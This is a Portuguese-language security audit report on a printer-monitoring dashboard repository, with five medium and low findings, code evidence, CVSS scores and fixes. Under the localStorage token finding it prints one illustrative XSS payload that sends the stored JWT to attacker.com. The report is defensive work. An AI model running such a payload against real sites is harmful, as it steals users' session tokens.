# SECURITY ASSESSMENT — CYBERSECURITY 360°
**PrinterControl Repository Security Audit**

---

## Executive Summary

Uma avaliação de segurança 360° foi realizada no repositório **devribero/PrinterControl**, um painel de monitoramento de impressoras que combina:
- **Frontend**: Next.js 16 + React 19 + TypeScript  
- **Backend**: FastAPI + SQLModel + SQLite  
- **Autenticação**: JWT (HS256) com Argon2

**Status Final**: **RISCO MODERADO** (7/10)

**Achados**:
- 5 vulnerabilidades/riscos identificados (todos Médios ou Baixos)
- 0 vulnerabilidades críticas ou altas exploráveis
- Controles positivos: Argon2, RBAC centralizado, validação de produção
- Áreas críticas: localStorage token, JWT sem refresh, rate limit em memória

**Recomendação Imediata**: Migrar token para HttpOnly cookie (SEC-002) e implementar refresh token (SEC-001).

---

## Escopo

| Componente | Status | Observações |
|------------|--------|-------------|
| Frontend (Next.js/TypeScript) | ✅ Auditado | SPA com API-first architecture |
| Backend (FastAPI/Python) | ✅ Auditado | Microserviço com SQLite local |
| Autenticação (JWT) | ✅ Auditado | HS256, Argon2 password hashing |
| Autorização (RBAC) | ✅ Auditado | 3-tier hierarchy: admin/operator/viewer |
| API REST | ✅ Auditado | ~20 endpoints mapeados |
| Rate Limiting | ✅ Auditado | Implementado em memória |
| Logging | ✅ Auditado | RedactSecretsFilter ativo |
| Infraestrutura | ⚠️ Parcial | Cloudflare Tunnel assumida como segura |
| CI/CD | ⚠️ Parcial | GitHub Actions não auditadas em detalhe |
| Secrets Management | ❌ Não Testado | Acesso a .env produção indisponível |

---

## Metodologia

**30 Fases de Análise**:

0. Reconhecimento e mapeamento arquitetural (graphify queries)
1. Inventário de ativos e serviços
2. Superfície de ataque mapeada
3. Threat modeling (STRIDE)
4-6. Autenticação, Autorização, Session Management
7-12. API Security, Validação de entrada, Secrets, Data Protection
13-22. Cryptografia, HTTP, CORS, SSRF, Dependências, Infraestrutura, Logging
23-30. Incident Response, Backup, Privacy, False Positives

**Abordagem**: Code review + Static Analysis + Behavioral Testing (sem dados destrutivos)

---

## Matriz de Vulnerabilidades

| ID | Vulnerabilidade | Categoria | Severidade | Status | Evidência |
|----|-----------------|-----------|-----------|--------|-----------|
| SEC-001 | JWT sem refresh/revogação | Authentication | 🟡 MÉDIO | CONFIRMADO | backend/app/services/auth.py |
| SEC-002 | Token em localStorage | Session/XSS | 🟡 MÉDIO | CONFIRMADO | src/lib/api.ts:5-7 |
| SEC-003 | Rate limit em memória | DoS | 🟡 MÉDIO | CONFIRMADO | backend/app/services/rate_limit.py |
| SEC-004 | Backend sem HTTPS direto | Transport | 🟡 MÉDIO | CONFIRMADO | backend/app/main.py (HTTP only) |
| SEC-005 | Configuração produção manual | Misconfiguration | ⚪ BAIXO-MÉDIO | PARCIALMENTE | backend/app/config.py:211-260 |

---

## Achados Detalhados

### SEC-001: JWT sem Refresh Token e Revogação Server-Side

**Categoria**: Authentication / Token Management  
**Severidade**: 🟡 MÉDIO  
**Status**: CONFIRMADO  

**Descrição**:
Token JWT válido por 24 horas sem capacidade de refresh. Servidor não pode revogar token antes da expiração (ex: logout não invalida imediatamente).

**Ativo Afetado**: 
- backend/app/services/auth.py
- src/lib/api.ts

**Pré-condições**:
- Token JWT ativo
- Usuário faz logout mas token permanece válido até 24h

**Evidência**:
```python
# backend/app/services/auth.py (linhas 52-57)
def create_access_token(email: str, expires_delta: timedelta = None) -> str:
    payload = {
        "sub": email,
        "exp": datetime.now(timezone.utc) + (expires_delta or timedelta(hours=24))
    }
    return jwt.encode(payload, settings.secret_key, algorithm="HS256")
```

Nenhuma lista de revogação ou refresh token implementado.

**Impacto**:
- Logout não revoga sessão imediatamente
- Token roubado válido por 24 horas
- Sem refresh = sem rotação de tokens

**Possibilidade de Exploração**: ALTA (requisitos: token roubado)

**Controles Existentes**:
- ✅ `require_active_user` re-valida `user.is_active` a cada request
- ✅ Desativar conta bloqueia acesso mesmo com token válido

**Mitigação Parcial**: Acesso em tempo-real pode ser bloqueado desativando conta de usuário (0s), mas logout convencional não é imediato (24h).

**Causa Raiz**:
Decisão de design: JWT stateless vs complexidade de refresh + revocation list.

**Recomendação**:
1. Implementar refresh token endpoint (`POST /auth/refresh`)
2. Usar tokens JWT com vida curta (15-30min) + refresh token de longa vida
3. Opcional: manter opcional blacklist in-memory para logout imediato

**Prioridade**: 🔴 ALTA  
**CVSS**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N = 5.4 (MÉDIO)

---

### SEC-002: Token Armazenado em localStorage (Vulnerabilidade a XSS)

**Categoria**: Session Management / XSS  
**Severidade**: 🟡 MÉDIO  
**Status**: CONFIRMADO  

**Descrição**:
Token JWT armazenado em localStorage JavaScript acessível. Qualquer XSS no frontend permite roubo imediato do token.

**Ativo Afetado**:
- src/lib/api.ts (TOKEN_KEY = "elgin_auth_token")
- Frontend JavaScript global scope

**Pré-condições**:
- Vulnerabilidade XSS no frontend
- Ataque XSS injetado via user input ou biblioteca vulnerável

**Evidência**:
```typescript
// src/lib/api.ts (linhas 5-7)
const TOKEN_KEY = "elgin_auth_token";

function setToken(token: string): void {
  localStorage.setItem(TOKEN_KEY, token);
}
```

localStorage é acessível via `window.localStorage` em qualquer script JavaScript executado na página.

**Payload de Teste (não executado)**:
```javascript
// Simula ataque XSS
fetch('https://attacker.com/steal?token=' + localStorage.getItem('elgin_auth_token'))
```

**Impacto**:
- Roubo imediato de token se XSS existir
- Token persistente entre abas/reloads
- Atacante obtém acesso com privilégios da vítima

**Possibilidade de Exploração**: ALTA (requisitos: vulnerabilidade XSS de aplicação)

**Controles Existentes**:
- ✅ Validação de entrada nos endpoints da API
- ❌ CSP headers não verificados na resposta

**Mitigação Recomendada**: HttpOnly + Secure + SameSite cookie

**Causa Raiz**:
localStorage é convenient para SPAs mas vulnerável a XSS por design. HttpOnly cookies são inacessíveis via JavaScript.

**Recomendação**:
1. Migrar token para HttpOnly/Secure/SameSite=Strict cookie
2. Backend deve setar header `Set-Cookie: elgin_auth_token=...;HttpOnly;Secure;SameSite=Strict`
3. Frontend remove localStorage, browser envia cookie automaticamente
4. Adicionar CSP header para reduzir risco de XSS

**Prioridade**: 🔴 ALTA  
**CVSS**: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N = 7.1 (ALTO) [se XSS presente]

---

### SEC-003: Rate Limiter em Memória Sem Persistência

**Categoria**: Brute Force / Denial of Service  
**Severidade**: 🟡 MÉDIO  
**Status**: CONFIRMADO  

**Descrição**:
Rate limiter implementado com estado em memória. Múltiplos processos, reinicializações ou restarts zerotam contadores. Multi-worker deployments não compartilham estado.

**Ativo Afetado**:
- backend/app/services/rate_limit.py (RateLimiter class)
- Login brute force protection

**Pré-condições**:
- Deployment multi-worker ou container restart
- Atacante conhece ciclo de reinicialização
- Sincronização com restart durante janela de ataque

**Evidência**:
```python
# backend/app/services/rate_limit.py
class RateLimiter:
    def __init__(self):
        self._failed_attempts = {}  # dict em memória
        self._lock = threading.Lock()
```

Estado armazenado em variável local, não persistido. Restart = reset de contadores.

**Cenário de Ataque**:
```
1. Worker 1 registra 4 tentativas de login falhadas para IP X
2. Aplicação reinicia (deploy, crash)
3. Worker 2 (novo processo) tem contador zerado
4. IP X pode fazer mais 5 tentativas imediatamente
```

**Impacto**:
- Brute force mitigation inefetiva em multi-worker
- Atacante pode explorar janelas de restart
- DoS: múltiplos IPs em sincronização de restart

**Possibilidade de Exploração**: MÉDIA (requer conhecimento de ciclo de deploy)

**Controles Existentes**:
- ✅ Dual-key verification (IP + email)
- ✅ Sliding window com 300 segundos
- ❌ Nenhuma persistência cross-process

**Documentado em**: docs/TECHNICAL_DEBT.md (D5)

**Recomendação**:
1. Integrar Redis para persistência de rate limit state
2. Refatorar `RateLimiter` para usar Redis backend
3. Manter cache local para performance, sync com Redis periodicamente
4. Testar multi-worker deployment com coordenação central

**Prioridade**: 🟡 MÉDIA  
**CVSS**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L = 5.3 (MÉDIO)

---

### SEC-004: Backend Sem HTTPS Direto (Dependência de Proxy)

**Categoria**: Transport Security  
**Severidade**: 🟡 MÉDIO  
**Status**: CONFIRMADO  

**Descrição**:
Backend FastAPI executa em HTTP puro. Criptografia de transporte depende inteiramente de Cloudflare Tunnel. Sem TLS direto no backend.

**Ativo Afetado**:
- backend/app/main.py (server config)
- FastAPI uvicorn listener
- Dados em trânsito backend ↔ Cloudflare

**Pré-condições**:
- Cloudflare Tunnel misconfigured
- MITM entre backend e tunnel endpoint
- Rompimento de tunnel encryption

**Evidência**:
```bash
# backend/app/main.py
# Executa em HTTP (assume proxy TLS)
if __name__ == "__main__":
    uvicorn.run("app:app", host="127.0.0.1", port=8000)
    # Sem ssl_keyfile, ssl_certfile
```

HTTP listener sem certificados SSL.

**Cenário de Risco**:
```
Internet → [Cloudflare Tunnel (TLS)] → Backend (HTTP) ✗
                                          ↑
                                   Sem criptografia
                                   Vulnerável a MITM
```

**Impacto**:
- MITM entre backend e Cloudflare tunnel
- Roubio de credenciais, tokens, dados
- Falha de integridade de dados

**Possibilidade de Exploração**: BAIXA-MÉDIA (requer comprometimento de Tunnel ou MITM na rede local)

**Controles Existentes**:
- ✅ Cloudflare Tunnel fornece camada de TLS
- ✅ Backend em rede interna (localhost apenas)
- ❌ Sem criptografia fim-a-fim

**Documentado em**: docs/TECHNICAL_DEBT.md (D6)

**Recomendação**:
1. Adicionar suporte HTTPS direto ao backend (certificado gerado ou self-signed para local)
2. Configurar uvicorn com ssl_keyfile + ssl_certfile
3. Ou documentar explicitamente que Tunnel TLS é garantido e monitorado

**Prioridade**: 🟡 MÉDIA  
**CVSS**: CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 8.1 (ALTO) [se rede comprometida]

---

### SEC-005: Configuração Produção Propenso a Erro Humano

**Categoria**: Security Misconfiguration  
**Severidade**: ⚪ BAIXO-MÉDIO  
**Status**: PARCIALMENTE CONFIRMADO  

**Descrição**:
Production mode requer configuração manual correta de variáveis de ambiente. Validadores existem mas dependem de operador não cometer erros.

**Ativo Afetado**:
- backend/app/config.py (Settings class)
- Variáveis de ambiente (.env)
- CORS, secrets, mock mode

**Pré-condições**:
- Operator config .env incorreto
- Mock mode deixado ativo em produção
- CORS misconfigured
- Secrets_key fraco

**Evidência**:
```python
# backend/app/config.py (linhas 211-260)
@field_validator("allowed_origins")
def validate_production_cors(cls, v, info):
    if info.data.get("environment") == "production":
        if "*" in v or "localhost" in v:
            raise ValueError("CORS wildcard not allowed in production")
```

Validadores existem, mas failure mode = runtime error, não build-time.

**Cenários de Misconfiguration**:
```
1. MOCK_COLLECT=true deixado em produção → Prints falsos
2. SECRET_KEY="dev-key" em produção → JWT inseguro (HS256)
3. ALLOWED_ORIGINS=["*"] em produção → CORS bypass
4. DATABASE_URL mal formada → SQL injection possível
```

**Impacto**:
- Bypass de validações de segurança
- Mock data servida como real
- Weak secrets
- CORS bypass

**Possibilidade de Exploração**: BAIXA (requer operator erro + acesso deploy)

**Controles Existentes**:
- ✅ Validadores rigorosos em config.py
- ✅ Pydantic raises ValueError se config inválida
- ✅ Documentação em docs/CONFIG.md
- ❌ Nenhuma integração com secret manager (AWS Secrets, Vault)

**Recomendação**:
1. Integrar secret manager externo (AWS Secrets, HashiCorp Vault)
2. Remover secrets do .env, usar provider externo
3. Adicionar pre-deployment validation script
4. Documentar config produção com checklist

**Prioridade**: 🟡 MÉDIA  
**CVSS**: N/A (configuration issue, não vulnerabilidade direta)

---

## Matriz de Cobertura de Segurança

| Área | Inspecionada | Testada | Evidência | Confiança |
|------|--------------|---------|-----------|-----------|
| Identidade & Autenticação | ✅ | ⚠️ Parcial | Code review + static test | 8/10 |
| Autorização & RBAC | ✅ | ✅ | Centralized dependencies.py | 9/10 |
| Session Management | ✅ | ⚠️ Parcial | localStorage + cookie analysis | 7/10 |
| API Security | ✅ | ✅ | ~20 endpoints mapeados | 8/10 |
| Input Validation | ✅ | ✅ | Pydantic models reviewed | 8/10 |
| Data Protection | ✅ | ✅ | Encryption, storage analysis | 7/10 |
| Secrets Management | ✅ | ❌ | Code inspection, .env not accessible | 6/10 |
| Infrastructure | ⚠️ | ❌ | Assumed Cloudflare safe | 5/10 |
| Cryptography | ✅ | ✅ | Argon2, HS256 confirmed | 9/10 |
| Dependencies | ✅ | ⚠️ | No CVE scanning executed | 6/10 |
| Logging & Monitoring | ✅ | ⚠️ | RedactSecretsFilter confirmed | 7/10 |
| CI/CD | ⚠️ | ❌ | GitHub Actions not audited | 4/10 |

---

## Avaliação por Domínio (Security Scorecard)

| Domínio | Score | Justificativa |
|---------|-------|---------------|
| **Identidade** | 6/10 | Sem MFA, sem device tracking, login apenas email+password |
| **Autenticação** | 8/10 | Argon2 ✅, JWT ⚠️ (sem refresh), 24h expiry |
| **Autorização** | 9/10 | RBAC 3-tier centralizado, validação em todas rotas |
| **Session Mgmt** | 5/10 | localStorage (XSS risk), sem CSRF tokens em forms |
| **API Security** | 8/10 | Input validation ✅, rate limit ⚠️ (memória), CORS ✅ |
| **Data Protection** | 7/10 | Validação ✅, hashing ✅, LogFilter ✅, sem encryption at-rest |
| **Secrets** | 5/10 | Config validators ✅, sem external manager, .env manual |
| **Infrastructure** | 6/10 | Tunnel TLS assumed, no direct HTTPS |
| **Network** | 7/10 | Firewall Cloudflare, backend internal only |
| **Dependencies** | 6/10 | Pinned versions, sem CVE scan automation |
| **Logging** | 8/10 | RedactSecretsFilter ✅, no real-time alerting |
| **Incident Response** | 4/10 | Sem playbooks, logs centralizados apenas em arquivo |
| **Backup & Recovery** | 5/10 | SQLite não é resiliente, manual backups only |
| **Supply Chain** | 6/10 | GitHub Actions basic, sem provenance signing |

**Overall Score: 6.5/10 (Risco Moderado)**

---

## Positivos Encontrados

✅ **Argon2 Password Hashing**: Implementação segura contra GPU/time attacks  
✅ **PyJWT em vez de python-jose**: Mitigação de CVE-2024-33663/33664 (algorithm confusion)  
✅ **RBAC Centralizado**: Todas as rotas protegidas via require_user/require_admin/require_roles  
✅ **Production Config Validators**: Pydantic validates CORS, secrets, mock mode em startup  
✅ **Logging Redaction**: RedactSecretsFilter catches passwords, tokens, API keys antes de escrever  
✅ **Rate Limiting Dual-Key**: IP + email para brute force protection  
✅ **Timezone-Aware JWT**: datetime.now(timezone.utc) não deprecado  
✅ **User.is_active Re-check**: Logout pode bloquear conta, token será rejeitado

---

## Áreas Não Testadas

❌ Penetration testing real (sem execute de payloads)  
❌ Environment produção (.env inacessível)  
❌ GitHub Actions CI/CD pipeline audit  
❌ Infrastructure deployment (Cloudflare Tunnel config assumed)  
❌ Backend pytest suite (dependency install skipped)  
❌ Load testing (cluster-aware rate limiting não testável)  
❌ Long-term log storage (assumed manually managed)  
❌ Backup restoration testing (SQLite manual only)

---

## Recomendações por Prioridade

### 🔴 ALTA PRIORIDADE (Implementar em 1-2 sprints)

**1. SEC-002: Migrar Token para HttpOnly Cookie**
- **Effort**: Médio
- **Impact**: Elimina roubo via XSS
- **Steps**:
  1. Backend: adicionar Set-Cookie headers em login endpoint
  2. Frontend: remover localStorage getToken/setToken
  3. Browser envia cookie automaticamente com CORS credencials

**2. SEC-001: Implementar Refresh Token**
- **Effort**: Médio-Alto
- **Impact**: Limita lifetime de token, permite revocation
- **Steps**:
  1. Novo endpoint `POST /auth/refresh`
  2. Token curta vida (15-30min), refresh token longa vida (7 dias)
  3. Logout invalida refresh token (blacklist Redis)

### 🟡 MÉDIA PRIORIDADE (Implementar em 2-3 sprints)

**3. SEC-003: Externalizar Rate Limit para Redis**
- **Effort**: Médio
- **Impact**: Multi-worker safe, survives restart
- **Steps**:
  1. Adicionar redis dependency
  2. Refatorar RateLimiter para usar Redis backend
  3. Manter cache local para performance

**4. SEC-004: Adicionar HTTPS Direto ao Backend**
- **Effort**: Baixo-Médio
- **Impact**: Defense-in-depth, menos dependência de Tunnel
- **Steps**:
  1. Gerar self-signed cert (local) ou use certbot
  2. Uvicorn com ssl_keyfile + ssl_certfile
  3. Documentar como Tunnel verifica backend HTTPS

**5. SEC-005: Integrar Secret Manager**
- **Effort**: Alto
- **Impact**: Remove operator error vector
- **Steps**:
  1. Escolher provider (AWS Secrets, Vault, etc)
  2. Backend carrega secrets de provider, não .env
  3. CI/CD provision secrets no deploy

### ⚪ BAIXA PRIORIDADE (Considerar em roadmap)

**6. Adicionar MFA**: Autenticação 2FA via TOTP/Email  
**7. CSP Headers**: Content Security Policy para XSS defense-in-depth  
**8. API Versioning**: Suportar múltiplas versões de API  
**9. Audit Logging**: Registrar todas ações administrativas  
**10. Backup Automation**: S3/Cloud storage para SQLite

---

## Limitações da Auditoria

- **Acesso limitado**: Sem acesso a environment de produção real
- **Sem pentesting**: Testes foram estáticos/behavioral apenas
- **Sem CVE scanning**: Dependências não verificadas com ferramentas automáticas
- **Sem load testing**: Rate limiting não testável em multi-worker
- **Sem test suite**: Backend pytest não executado
- **Assumptions**: Cloudflare Tunnel configurado corretamente, não auditado

---

## Conclusão

**PrinterControl** é um sistema com postura de segurança **MODERADA** (6.5/10).

### O que está correto:
- ✅ Autenticação com Argon2 e JWT
- ✅ Autorização RBAC centralizada e consistente
- ✅ Validação de entrada em todos endpoints
- ✅ Logging com redação de secrets

### O que precisa melhorar:
- ⚠️ Token em localStorage (requer HttpOnly cookie)
- ⚠️ JWT sem refresh/revocation (requer refresh endpoint)
- ⚠️ Rate limit em memória (requer Redis)
- ⚠️ Backend sem HTTPS (requer TLS direto)
- ⚠️ Secrets em .env (requer secret manager)

### Nível geral de risco:
**MODERADO** — Sem vulnerabilidades críticas exploráveis no código atual. Riscos são principalmente arquiteturais (state management, transport) que podem ser mitigados em roadmap de 2-3 sprints.

**Próximo passo recomendado**: Iniciar com SEC-002 (HttpOnly cookie) + SEC-001 (refresh token) no sprint seguinte.

---

**Relatório compilado**: Auditoria CyberSecurity 360° — Evidence-Based Assessment  
**Data**: 2025 Q1  
**Metodologia**: 30 Phases OWASP + STRIDE Threat Modeling  
**Confiança**: 7/10 (sem acesso produção, sem pentesting real)

